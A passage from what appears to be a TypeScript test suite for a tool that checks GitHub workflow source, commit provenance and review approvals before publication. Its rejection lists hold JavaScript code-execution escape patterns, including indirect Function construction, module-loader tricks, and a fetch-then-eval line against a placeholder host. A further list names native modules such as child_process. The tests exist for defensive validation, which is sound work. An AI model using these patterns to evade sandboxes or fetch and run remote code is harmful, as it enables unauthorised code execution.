  f.setMode('publish');
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});

it('publisher-inventory-C30: a verified empty namespace becomes stale when a condition variable is created', async () => {
  const f = conditionalFixture('job'); f.setMode(undefined); bindVariableContext(f, {});
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
  f.request.mockClear(); f.setMode('publish');
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
});

it.each(['digest', 'source commit', 'source content'] as const)(
  'publisher-inventory-C30: the complete namespace witness rejects a substituted %s', async fault => {
    const f = conditionalFixture('job', true), source = f.document.units.find(unit => unit.id === 'workflow-ci')!;
    const record = f.document.inputs.find(input => input.input === 'vars-context')!;
    record.sourceFingerprint = fault === 'digest' ? '0'.repeat(64) : publisherInventorySha256({
      kind: 'publisher-inventory-variable-context', source: { repositoryId: source.repositoryId,
        commit: fault === 'source commit' ? '8'.repeat(40) : source.commit, path: source.path,
        contentSha256: fault === 'source content' ? '0'.repeat(64) : source.contentSha256 },
      variables: { effectiveVariablesSha256: publisherInventorySha256({ MODE: { origin: 'repository-variable', value: 'observe' } }) } });
    f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
    expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
  });

it('publisher-inventory-C30: changed namespace evidence requires a different exact operation approval', async () => {
  const before = conditionalFixture('job', true), after = conditionalFixture('job');
  after.setMode('publish'); bindVariableContext(after, { MODE: { origin: 'repository-variable', value: 'publish' } });
  const first = await before.inspectComplete(), second = await after.inspectComplete();
  expect(after.document.units).toEqual(before.document.units);
  expect(after.locator.documentSha256).not.toBe(before.locator.documentSha256);
  const plan = (f: typeof before, snapshot: typeof first) => planSetupPublisherInstallation(f.proposal, snapshot.inspection,
    '11111111-1111-4111-8111-111111111111');
  expect(plan(after, second).approvalDigest).not.toBe(plan(before, first).approvalDigest);
});

it('publisher-inventory-C30: namespace binding also covers a variable used only by other execution metadata', async () => {
  const f = conditionalFixture('concurrency', true);
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
  f.setMode('publish'); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
});

it('publisher-inventory-C35: condition-variable drift during real preview stops approval before delivery', async () => {
  const source = conditionalFixture('job', true), f = reviewedOperation(source);
  f.present.mockImplementation(async () => { source.setMode('publish'); });
  await expect(f.execute()).rejects.toMatchObject({ reason: 'stale' });
  expect(f.confirm).toHaveBeenCalledTimes(1); expect(f.apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});

it.each(['tree', 'commit', 'branch'] as const)(
  'publisher-inventory-C36: condition-variable drift after %s stops the next real delivery phase', async effect => {
    const f = conditionalFixture('step', true), state = controlledDelivery(f, completed => {
      if (completed === effect) f.setMode('publish');
    });
    const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-condition-moved-'));
    try {
      const journal = new SetupPublisherJournalAdapter(directory);
      await expect(executeControlledInstallation(f, journal)).rejects.toMatchObject({ reason: 'stale', retained: { status: 'partial' } });
      const phases = ['tree', 'commit', 'branch'], count = phases.indexOf(effect) + 1;
      expect(f.request.mock.calls.filter(([route]) => route.startsWith('POST '))).toHaveLength(count);
      expect((await journal.load(state.operation))!.effects).toEqual(phases.slice(0, count));
    } finally { await rm(directory, { recursive: true, force: true }); }
  });


it.each([
  'globalThis["Function"]("return 1")();',
  '(function () {})["constructor"]("return 1")();',
  '(async () => {}).constructor("return 1")();',
  '(function* () {}).constructor("yield 1")();',
  'const F = Function; F("return 1")();',
  'Reflect.construct(Function, ["return 1"])();',
  'new Proxy(Function, {})("return 1")();',
  'const { constructor: F } = (() => {}); F("return 1")();',
  'const f = () => {}; f["con" + "structor"]("return 1")();',
  'const f = () => {}; f["con\\u0073tructor"]("return 1")();',
  'Object.getPrototypeOf(async () => {}).constructor("return 1")();',
  'Object.getOwnPropertyDescriptor(() => {}, "constructor").value("return 1")();',
  'const O = Object; O.getPrototypeOf(() => {}).constructor("return 1")();',
  'function unrelated() { const Function = value => value; } Function("return 1")();',
  'function unrelated() { const globalThis = {}; } globalThis.Function("return 1")();',
  'function leak() { return this; } leak()["Function"]("return 1")();',
  'function leak() { "use\\x20strict"; return this; } leak()["Function"]("return 1")();',
  'function leak() { return arguments.callee.caller.arguments[1]; } leak()("node:fs");',
  'arguments[1]("node:fs");',
  'const loader = require; loader("node:fs");',
  'require.resolve("./helper.js");',
  'module.require("node:fs");',
  'const m = module; m.require("node:fs");',
  'process.getBuiltinModule("node:vm");',
  'const p = process; p.getBuiltinModule("node:vm");',
  'Error.prepareStackTrace = (_error, frames) => frames; new Error().stack[0].getThis();',
  'const frame = {}; frame.getFunction()();',
  'fetch("https://unbound.invalid/program").then(r => r.text()).then(source => globalThis["Function"](source)());',
  'import(process.env.MODULE);',
  'import("data:text/javascript,console.log(1)");',
  'import("./helper.js", { with: { type: "json" } });',
  'require("./helper.js", {});',
  'const = ;',
] as const)('publisher-inventory-C27: parsed Node closure rejects an unbound execution capability: %s', async program => {
  const f = nodeAction(program);
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
  expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
});

it.each(['node:inspector', 'node:inspector/promises', 'node:repl', 'node:vm', 'node:module', 'node:v8', 'node:sqlite',
  'node:wasi', 'node:child_process', 'node:worker_threads', 'node:test'])(
  'publisher-inventory-C27: native module %s cannot hide executable input behind a static import', async dependency => {
    const f = nodeAction(`import * as capability from ${JSON.stringify(dependency)}; console.log(capability);`);
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  });

it.each([
  'console.log("Function require eval constructor import");',
  'function Function(value) { return value; } console.log(Function("data"));',
  'function local(module) { return module.value; } console.log(local({ value: 1 }));',
  'const globalThis = { value: 1 }; console.log(globalThis.value);',
  'class Record { #value = 1; constructor() { this.other = 1; } read() { return this.#value; } } console.log(new Record().read());',
  '"use strict"; function value() { return this; } console.log(value());',
  'function value() { "use strict"; return this; } console.log(value());',
  'const value = () => this; console.log(value());',
  'const value = { ["literal"]: 1 }; console.log(Object.keys(value));',
  'console.log([9][0]);',
  'module.exports = { value: 1 };',
  'export const value = 1;',
  'console.log(import.meta.url);',
  'console.log(process.env.MODE);',
] as const)('publisher-inventory-C27: parsed source preserves a closed data-only Node program: %s', async program => {
  const f = nodeAction(program, undefined, program === 'console.log(process.env.MODE);' ? 'env: { MODE: controlled }\n' : '');
  if (program === 'console.log(process.env.MODE);') bindRootEnvironment(f, { MODE: 'controlled' });
  const snapshot = await f.inspectComplete();
  expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});

it('publisher-inventory-C27: a fixed in-memory oracle proves indirect construction executes the unbound program', async () => {
  const program = 'fetch("https://owned.invalid/program").then(r => r.text()).then(source => globalThis["Function"](source)());';
  const context = { fetch: async () => ({ text: async () => 'globalThis.observed = "unbound";' }), observed: undefined as string | undefined };
  await expect(nodeAction(program).inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(context.observed).toBeUndefined();
  await runInNewContext(program, context);
  expect(context.observed).toBe('unbound');
});

it.each([['within', 3333, 61], ['within depth', 1, 61], ['node limit', 3334, 1], ['depth limit', 1, 62]] as const)(
  'publisher-inventory-C27: parsed source has a closed structural bound: %s', async (label, statements, nesting) => {
    const program = label === 'within' || label === 'node limit' ? 'void 0;\n'.repeat(statements)
      : `const value = ${'['.repeat(nesting)}0${']'.repeat(nesting)};`;
    const f = nodeAction(program);
    if (label === 'within' || label === 'within depth') await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
    else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  });

it('publisher-inventory-C27: distinct static dependencies retain executable source order', async () => {
  const main = 'import { first } from "./first.js"; export { second } from "./second.js"; console.log(first);';
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: 'name: Owned\nruns:\n  using: node24\n  main: main.js\n' },
      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: main },
      { id: 'first', path: 'action/first.js', kind: 'node-entrypoint', content: 'export const first = 1;' },
      { id: 'second', path: 'action/second.js', kind: 'node-entrypoint', content: 'export const second = 2;' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' },
      { from: 'main', to: 'first', role: 'import:1' }, { from: 'main', to: 'second', role: 'import:2' }] });
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
  for (const edge of f.document.edges.filter(edge => edge.from === 'main')) edge.role = edge.role === 'import:1' ? 'import:2' : 'import:1';
  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});

it.each(['build_linux', '_build'])(
  'publisher-inventory-C30: actual complete reader binds effective input to a valid job ID: %s', async job => {
    const workflow = `on: push\njobs:\n  ${job}:\n    env:\n      MODE: reviewed\n    steps:\n      - run: printf reviewed\n`;
    const f = fixture({ workflow, programs: [{ id: 'job-shell', path: workflowPath, kind: 'shell-program', content: workflow }],
      edges: [{ from: 'workflow-ci', to: 'job-shell', role: `run:${job}:1` }] });
    const source = f.document.units.find(unit => unit.id === 'workflow-ci')!;
    const anchor = { workflow: workflowPath, job, step: 0, input: 'env:MODE', origin: 'job-env' as const };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: source.repositoryId, commit: source.commit,
        path: source.path, contentSha256: source.contentSha256 }, definition: 'reviewed', effectiveEnvironment: { MODE: 'reviewed' },
      callerInputs: {}, variables: {} }) }); f.seal();
    const snapshot = await f.inspectComplete();
    expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
  });

it.each(['author', 'committer', 'publisher', 'creator'])(
  'publisher-inventory-C12: a User account recorded as the evidence %s cannot approve it independently', async role => {
    const f = fixture(), preparer = { id: 9, login: 'preparer', type: 'User' }, reviewer = { id: 17, login: 'reviewer', type: 'User' };
    f.setPreparingCommits([{ sha: head, author: role === 'author' ? reviewer : preparer, committer: role === 'committer' ? reviewer : preparer }]);
    f.setActivity([{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
      activity_type: 'push', actor: role === 'publisher' ? reviewer : preparer },
    { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
      activity_type: 'branch_creation', actor: role === 'creator' ? reviewer : preparer }]);
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
    expect(f.request.mock.calls.some(([route]) => route.endsWith('/activity'))).toBe(true);
    expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission')
      && parameters.owner === 'owner' && parameters.username === 'reviewer')).toBe(false);
  });

it('publisher-inventory-C12: a bracket-suffixed Bot preparer does not hide an independent User approval', async () => {
  const f = fixture(), bot = { id: 19, login: 'owned-automation[bot]', type: 'Bot' };
  f.setPreparingCommits([{ sha: head, author: bot, committer: bot }]);
  f.setActivity([{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
    activity_type: 'push', actor: bot }, { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
    activity_type: 'branch_creation', actor: bot }]);
  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission') && parameters.username === bot.login)).toBe(false);
});
it('publisher-inventory-C12: bracket-suffixed Bot reviews neither approve nor veto an independent User decision', async () => {
  const f = fixture(), human = { id: 101, user: { id: 17, login: 'reviewer', type: 'User' }, state: 'APPROVED',
    submitted_at: '2026-11-28T00:00:00Z', commit_id: head, body: marker(f.document) };
  const bot = { ...human, id: 102, user: { id: 19, login: 'owned-automation[bot]', type: 'Bot' } };
  for (const state of ['APPROVED', 'CHANGES_REQUESTED']) {
    f.setReviews([human, { ...bot, state }]);
    await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  }
  f.setReviews([bot]);
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
  expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission') && parameters.username === bot.user.login)).toBe(false);
});
it('publisher-inventory-C15: changed publication principals change the exact approval while source and reviewer stay fixed', async () => {
  const f = fixture(), before = await f.inspectComplete();
  const preparer = { id: 9, login: 'preparer', type: 'User' }, publisher = { id: 19, login: 'publisher', type: 'User' };
  f.setActivity([{ id: 204, ref: 'refs/heads/feature/inventory-review', before: 'a'.repeat(40), after: head, activity_type: 'force_push', actor: publisher },
    { id: 203, ref: 'refs/heads/feature/inventory-review', before: head, after: 'a'.repeat(40), activity_type: 'force_push', actor: publisher },
    { id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head, activity_type: 'push', actor: preparer },
    { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase, activity_type: 'branch_creation', actor: preparer }]);
  const after = await f.inspectComplete();
  expect(after.inspection.installation.inventoryReview!.documentSha256).toBe(before.inspection.installation.inventoryReview!.documentSha256);
  expect(after.inspection.installation.inventoryReview!.decisionsSha256).not.toBe(before.inspection.installation.inventoryReview!.decisionsSha256);
  const operation = '11111111-1111-4111-8111-111111111111';
  expect(planSetupPublisherInstallation(f.proposal, after.inspection, operation).approvalDigest)
    .not.toBe(planSetupPublisherInstallation(f.proposal, before.inspection, operation).approvalDigest);
});

it.each([0, 251, 1.5, '1', null, undefined])(
  'publisher-inventory-C50: an incomplete or unsupported commit count cannot establish preparation: %s', async count => {
    const f = fixture(); f.pull.commits = count;
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
    expect(f.request.mock.calls.some(([route]) => route.endsWith('/pulls/{pull_number}/commits'))).toBe(false);
  });

it.each(['missing author', 'missing committer', 'invalid account', 'unsafe login', 'unknown account type',
  'wrong head', 'duplicate commit', 'inconsistent identity', 'incomplete page', 'overfull page', 'non-array page'])(
  'publisher-inventory-C50: malformed commit provenance blocks the complete reader: %s', async fault => {
    const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
    const commit: Record<string, unknown> = { sha: head, author: actor, committer: actor };
    if (fault === 'missing author') commit.author = null;
    if (fault === 'missing committer') commit.committer = null;
    if (fault === 'invalid account') commit.author = { ...actor, id: 0 };
    if (fault === 'unsafe login') commit.author = { ...actor, login: 'bad/name' };
    if (fault === 'unknown account type') commit.author = { ...actor, type: 'Organization' };
    if (fault === 'wrong head') commit.sha = 'a'.repeat(40);
    if (fault === 'inconsistent identity') commit.committer = { ...actor, login: 'different-account' };
    if (fault === 'incomplete page') f.pull.commits = 2;
    let values: unknown = [commit];
    if (fault === 'duplicate commit') { f.pull.commits = 2; values = [commit, commit]; }
    if (fault === 'overfull page') { f.pull.commits = 101; values = Array.from({ length: 101 }, () => commit); }
    if (fault === 'non-array page') values = {};
    const original = f.request.getMockImplementation()!;
    f.request.mockImplementation(async (route, parameters) => route.endsWith('/pulls/{pull_number}/commits')
      ? { data: values } : original(route, parameters));
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
    expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
  });

it('publisher-inventory-C50: the complete250-commit boundary is read through all three authenticated pages', async () => {
  const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
  f.pull.commits = 250;
  f.setPreparingCommits(Array.from({ length: 250 }, (_, index) => ({ sha: index === 249 ? head : (index + 1).toString(16).padStart(40, '0'),
    author: actor, committer: actor })));
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/pulls/{pull_number}/commits')).map(([, parameters]) => parameters.page)).toEqual([1, 2, 3]);
});

it.each(['missing creation', 'unpublished head', 'foreign ref', 'duplicate event', 'malformed event', 'invalid before',
  'invalid after', 'unknown activity', 'unknown actor', 'empty page', 'overfull page', 'non-array page'])(
  'publisher-inventory-C50: incomplete or contradictory publication history stays unverified: %s', async fault => {
    const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
    const push: Record<string, unknown> = { id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
      activity_type: 'push', actor };
    const creation = { id: 201, ref: push.ref, before: '0'.repeat(40), after: evidenceBase, activity_type: 'branch_creation', actor };
    if (fault === 'unpublished head') push.after = 'a'.repeat(40);
    if (fault === 'foreign ref') push.ref = 'refs/heads/unrelated';
    if (fault === 'malformed event') push.id = 0;
    if (fault === 'invalid before') push.before = 'not-a-sha';
    if (fault === 'invalid after') push.after = 'not-a-sha';
    if (fault === 'unknown activity') push.activity_type = 'unrecognized';
    if (fault === 'unknown actor') push.actor = null;
    let values: unknown = fault === 'missing creation' ? [push] : [push, creation];
    if (fault === 'duplicate event') values = [push, push];
    if (fault === 'empty page') values = [];
    if (fault === 'overfull page') values = Array.from({ length: 101 }, () => push);
    if (fault === 'non-array page') values = {};
    const original = f.request.getMockImplementation()!;
    f.request.mockImplementation(async (route, parameters) => route.endsWith('/activity') ? { data: values } : original(route, parameters));
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
  });

const publicationLink = (cursor: string) => '<https://api.github.com/repos/owner/project/activity?'
  + new URLSearchParams({ ref: 'refs/heads/feature/inventory-review', per_page: '100', direction: 'desc', after: cursor }) + '>; rel="next"';

it('publisher-inventory-C50: authenticated cursor pagination includes a publishing actor on a later page', async () => {
  const f = fixture(), original = f.request.getMockImplementation()!, actor = { id: 9, login: 'preparer', type: 'User' };
  f.request.mockImplementation(async (route, parameters) => {
    if (!route.endsWith('/activity')) return original(route, parameters);
    if (parameters.after === undefined) return { data: [{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase,
      after: head, activity_type: 'push', actor }], headers: { link: publicationLink('second') } };
    expect(parameters.after).toBe('second');
    return { data: [{ id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
      activity_type: 'branch_creation', actor: { id: 17, login: 'reviewer', type: 'User' } }], headers: {} };
  });
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/activity'))).toHaveLength(2);
});

it.each([
  ['foreign origin', publicationLink('second').replace('api.github.com', 'example.invalid')],
  ['foreign repository', publicationLink('second').replace('/owner/project/', '/other/project/')],
  ['different ref', publicationLink('second').replace('inventory-review', 'other')],
  ['changed page size', publicationLink('second').replace('per_page=100', 'per_page=99')],
  ['changed direction', publicationLink('second').replace('direction=desc', 'direction=asc')],
  ['URL credentials', publicationLink('second').replace('https://', 'https://user:password@')],
  ['fragment', publicationLink('second').replace('>;', '#fragment>;')],
  ['duplicate query', publicationLink('second').replace('>;', '&ref=other>;')],
  ['extra query', publicationLink('second').replace('>;', '&token=unreviewed>;')],
  ['ambiguous cursor', publicationLink('second').replace('>;', '&before=other>;')],
  ['empty cursor', publicationLink('')],
  ['long cursor', publicationLink('x'.repeat(2049))],
  ['control cursor', publicationLink('\u0000')],
  ['malformed URL', '<not-a-url>; rel="next"'],
  ['duplicate relation', publicationLink('one') + ',' + publicationLink('two')],
  ['unknown relation', publicationLink('second').replace('rel="next"', 'rel="unknown"')],
  ['non-text header', 12],
  ['oversized header', 'x'.repeat(16_385)],
] as const)('publisher-inventory-C50: pagination cannot substitute a different authenticated activity scope: %s', async (_fault, link) => {
  const f = fixture(), original = f.request.getMockImplementation()!;
  f.request.mockImplementation(async (route, parameters) => {
    const response = await original(route, parameters);
    return route.endsWith('/activity') ? { data: response.data, headers: { link: link as unknown as string } } : response;
  });
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/activity'))).toHaveLength(1);
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});

it.each(['repeated cursor', 'pagination exhausted', 'empty continuing page'])(
  'publisher-inventory-C50: incomplete activity pagination never becomes complete authority: %s', async fault => {
    const f = fixture(), original = f.request.getMockImplementation()!; let calls = 0;
    f.request.mockImplementation(async (route, parameters) => {
      if (!route.endsWith('/activity')) return original(route, parameters);
      calls++;
      return { data: fault === 'empty continuing page' ? [] : [{ id: 300 + calls, ref: 'refs/heads/feature/inventory-review',
        before: evidenceBase, after: head, activity_type: 'push', actor: { id: 9, login: 'preparer', type: 'User' } }],
      headers: { link: publicationLink(fault === 'repeated cursor' ? 'same' : String(calls)) } };
    });
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
    expect(calls).toBe(fault === 'pagination exhausted' ? 10 : fault === 'repeated cursor' ? 2 : 1);
  });

it.each(['non-object page', 'overfull page', 'missing actor', 'unsafe login', 'unknown actor category',
  'unknown review state', 'non-text body', 'non-text submission', 'invalid commit'] as const)(
  'publisher-inventory-C50: malformed authenticated review protocol blocks authority: %s', async fault => {
    const f = fixture(), original = f.request.getMockImplementation()!;
    f.request.mockImplementation(async (route, p) => {
      const result = await original(route, p); if (!route.endsWith('/reviews')) return result;
      const rows = JSON.parse(JSON.stringify(result.data)) as Record<string, unknown>[];
      if (fault === 'non-object page') return { data: {} };
      if (fault === 'overfull page') return { data: Array.from({ length: 101 }, () => rows[0]) };
      if (fault === 'missing actor') rows[0].user = undefined;
      else if (fault === 'unsafe login') (rows[0].user as Record<string, unknown>).login = 'reviewer/another';
      else if (fault === 'unknown actor category') (rows[0].user as Record<string, unknown>).type = 'FutureActor';
      else if (fault === 'unknown review state') rows[0].state = 'FUTURE';
      else if (fault === 'non-text body') rows[0].body = {};
      else if (fault === 'non-text submission') rows[0].submitted_at = 1;
      else rows[0].commit_id = 'main';
      return { data: rows };
    });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'review-unavailable' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/permission'))).toBe(false);
  });
it.each(['repository ID', 'unit tree', 'missing unit', 'unit mode', 'source digest', 'aggregate source bytes'] as const)(
  'publisher-inventory-C25: independently authenticated executable source rejects changed %s', async fault => {
    const f = fixture(), unit = f.document.units.find(u => u.id === 'shell-ci')!, original = f.request.getMockImplementation()!;
    if (fault === 'unit tree') unit.tree = 'f'.repeat(40);
    if (fault === 'missing unit') unit.path = 'missing.js';
    if (fault === 'unit mode') unit.mode = '100755';
    if (fault === 'source digest') unit.contentSha256 = '0'.repeat(64);
    f.seal();
    f.request.mockImplementation(async (route, p) => {
      const result = await original(route, p);
      if (fault === 'repository ID' && route === 'GET /repos/{owner}/{repo}') return { data: { ...(result.data as object), id: 999 } };
      if (fault === 'aggregate source bytes' && route.endsWith('/git/trees/{tree_sha}')) {
        const tree = result.data as { tree: { type: string; sha: string }[] };
        return { data: { ...tree, tree: tree.tree.map(entry => entry.type === 'blob' && entry.sha === unit.blob
          ? { ...entry, size: 100_000_001 } : entry) } };
      }
      return result;
    });
    await expect(f.inspect()).rejects.toMatchObject({ reason: fault === 'aggregate source bytes' ? 'unresolved-closure' : 'binding-mismatch' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it.each([
  ['scalar workflow', 'true\n'], ['malformed YAML', 'jobs: [\n'], ['no jobs', 'on: push\n'], ['empty jobs', 'jobs: {}\n'],
  ['non-object job', 'jobs: {inspect: false}\n'], ['no job steps', 'jobs: {inspect: {}}\n'],
  ['container', 'jobs: {inspect: {container: image, steps: []}}\n'], ['environment', 'jobs: {inspect: {environment: production, steps: []}}\n'],
  ['services', 'jobs: {inspect: {services: {}, steps: []}}\n'], ['job defaults', 'jobs: {inspect: {defaults: {}, steps: []}}\n'],
  ['workflow defaults', 'defaults: {}\njobs: {inspect: {steps: []}}\n'], ['job secrets', 'jobs: {inspect: {secrets: inherit, steps: []}}\n'],
  ['invalid environment scope', 'env: []\njobs: {inspect: {steps: []}}\n'],
  ['invalid input name', 'env: {"invalid/name": value}\njobs: {inspect: {steps: []}}\n'],
  ['object input', 'env: {MODE: {nested: value}}\njobs: {inspect: {steps: []}}\n'],
  ['incomplete expression', 'env: {MODE: "${{ vars.MODE"}\njobs: {inspect: {steps: []}}\n'],
  ['cyclic metadata', 'extra: &cycle {again: *cycle}\njobs: {inspect: {steps: []}}\n'],
  ['implicit YAML merge', 'extra: &base {steps: []}\njobs: {inspect: {"<<": *base}}\n'],
  ['missing run and uses', 'jobs: {inspect: {steps: [{}]}}\n'],
  ['ambiguous run and uses', 'jobs: {inspect: {steps: [{run: "printf ok", uses: ./action}]}}\n'],
  ['non-object step', 'jobs: {inspect: {steps: [false]}}\n'], ['non-string run', 'jobs: {inspect: {steps: [{run: 1}]}}\n'],
  ['unsupported shell', 'jobs: {inspect: {steps: [{run: "printf ok", shell: pwsh}]}}\n'],
  ['unresolved working directory', 'jobs: {inspect: {steps: [{run: "printf ok", working-directory: elsewhere}]}}\n'],
  ['expression in shell', 'jobs: {inspect: {steps: [{run: "${{ inputs.command }}"}]}}\n'],
  ['missing variable selector', 'env: {MODE: "${{ vars.MODE }}"}\njobs: {inspect: {steps: []}}\n'],
])('publisher-inventory-C49: unsupported workflow execution remains unresolved: %s', async (_name, workflow) => {
  const f = fixture({ workflow });
  if (workflow.includes('vars.MODE')) {
    const original = f.request.getMockImplementation()!;
    f.request.mockImplementation((route, p) => route.endsWith('/actions/variables')
      ? Promise.resolve({ data: { total_count: 0, variables: [] } }) : original(route, p));
  }
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(['node20', 'node24'])('publisher-inventory-C28: complete %s pre/main/post source bindings are inspected', async using => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yaml', kind: 'action',
      content: `name: Fixture\nruns:\n  using: ${using}\n  main: ./main.js\n  pre: pre.js\n  post: post.js\n` },
    ...(['main', 'pre', 'post'] as const).map(role => ({ id: role, path: `action/${role}.js`, kind: 'node-entrypoint' as const, content: `console.log('${role}');\n` }))],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' },
      ...['main', 'pre', 'post'].map(role => ({ from: 'action', to: role, role }))] });
  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  const blobs = f.request.mock.calls.filter(([r]) => r.endsWith('/git/blobs/{file_sha}')).map(([, p]) => p.file_sha);
  for (const role of ['main', 'pre', 'post']) expect(blobs).toContain(f.document.units.find(u => u.id === role)!.blob);
});
it.each([
  ['missing runs', 'name: Fixture\n'], ['non-object runs', 'runs: []\n'], ['unsupported runtime', 'runs: {using: docker, image: Dockerfile}\n'],
  ['non-string entrypoint', 'runs: {using: node24, main: 7}\n'], ['absolute entrypoint', 'runs: {using: node24, main: /main.js}\n'],
  ['escaping entrypoint', 'runs: {using: node24, main: ../../main.js}\n'],
  ['composite without steps', 'runs: {using: composite}\n'],
])('publisher-inventory-C28: malformed or unsupported Action execution blocks: %s', async (_name, content) => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(["import { createHash } from 'node:crypto'; export const stable = true;\n",
  "const path = require('path'); module.exports = path.basename('controlled');\n"])(
  'publisher-inventory-C27: reviewed source may use a supported static native module without inventing another code unit', async content => {
    await expect(nodeAction(content).inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
  });
it.each(['valid JSON', 'undeclared executable data', 'cyclic program'] as const)(
  'publisher-inventory-C27: transitive module interpretation is complete for %s', async scenario => {
    const json = scenario !== 'cyclic program', path = json ? 'action/flags.' + (scenario === 'valid JSON' ? 'json' : 'txt') : 'action/helper.js';
    const main = json ? `const flags = require('./${path.split('/').at(-1)}'); module.exports = flags.enabled;\n` : "require('./helper.js');\n";
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: 'runs: {using: node24, main: main.js}\n' },
        { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: main },
